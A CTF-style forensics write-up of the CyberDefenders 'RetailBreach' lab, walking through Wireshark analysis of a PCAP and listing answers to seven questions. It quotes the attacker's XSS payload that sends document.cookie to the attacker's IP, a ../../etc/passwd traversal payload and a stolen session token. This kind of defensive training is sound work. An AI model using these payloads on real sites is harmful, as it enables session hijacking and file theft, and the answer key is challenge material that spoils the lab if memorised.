# **RetailBreach Lab**

## **Tools**
Platform: CyberDefenders

Category: Network Forensics

Difficulty: Easy

Tools: Wireshark


## **Description**
Investigate network traffic with Wireshark to identify attacker TTPs, extract XSS payloads and session tokens, and determine exploited web application vulnerabilities.

## **1. Goal**

In recent days, ShopSphere, a prominent online retail platform, has experienced unusual administrative login activity during late-night hours. These logins coincide with an influx of customer complaints about unexplained account anomalies, raising concerns about a potential security breach. Initial observations suggest unauthorized access to administrative accounts, potentially indicating deeper system compromise.

Your mission is to investigate the captured network traffic to determine the nature and source of the breach. Identifying how the attackers infiltrated the system and pinpointing their methods will be critical to understanding the attack's scope and mitigating its impact.

## **2. Key Clues**

- "...unusual administrative **login activity during late-night hours.**"
- "...logins coincide with an influx of customer complaints about **unexplained account anomalies**..."
- "...**suggest unauthorized access to administrative accounts, potentially indicating deeper system compromise.**"
- "...investigate the **captured network traffic**..."

## **3. Plan**

- I saw a "Start here" folder"
- I checked the README.txt and it shows additional information I need to know
- I looked into two folders "Artifacts" and "Tools"
- Artifacts folder contains 1 PCAP file while Tools folder shows network analysis tools
- Since I have wireshark installed already, I proceed to open RetailBreach.pcap from the Artifacts folder

## **4. Steps**

**Question 1: Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?**

1. I scrolled through the PCAP file looking for any distinct protocols and noticed that at the bottom of the list shows SSH protocol.
2. I also noticed that one of the frames had a info regarding "Client".
![](Attachments/Question%201.png)

Answer: 111.224.180.128

**Question 2: The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?**

1. Knowing that SSH protocol will prevent me from reading the info tab, I instead looked through the HTTP protocol with the `http` command.
2. I noticed there is a odd stringed file and I checked the HTTP info and noticed the user-agent is `GoBuster` which is program often used for pentesting.
![](Attachments/Question%202.png)

Answer: Gobuster

**Question 3: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?**

1. Using the previous filter, I added an addition in the command `http && not http.request.method == "GET"` to remove noises from the GET commands. I also notice there was a lot of 404 errors so I added another command `http && not http.request.method == "GET" && http.response.code != 404` to filter the noises further.
2. After going through each frame I found a script command in the html file.
![](Attachments/Question%203.png)

Answer: `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`

**Question 4: Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?**

1. Going down more I noticed that the destination IP address changed to `135.143.142.5` which is not the attacker's IP.
2. Finally I reached to the same script command.
![](Attachments/Question%204.png)

Answer: 2024-03-29 12:09

**Question 5: The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?**

1. Filtering with `http.cookie` I looked through the attacker's IP source and finding any suspicious activity.
2. I found a activity regarding /etc/passwd
![](Attachments/Question%205.png)

Answer: lqkctf24s9h9lg67teu8uevn3q

**Question 6: Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?**

1. Using the `http` filter again, I looked through the frames again and found that `log_viewer.php` is also including a command.
![](Attachments/Question%206.png)

Answer: log_viewer.php

**Question 7: Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?**

1. Scrolling a bit down I found the attacker tried to get information of /etc/passwd
![](Attachments/Question%207.png)

Answer: ../../../../../etc/passwd
## **5. Answers**

Question 1: 111.224.180.128

Question 2: Gobuster

Question 3: `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`

Question 4: 2024-03-29 12:09

Question 5: lqkctf24s9h9lg67teu8uevn3q

Question 6: log_viewer.php

Question 7: ../../../../../etc/passwd
## **6. Lessons Learned**

- Always do investigation as that was the key in the success of this challenge
- Sometimes looking through the frames one by one is necessary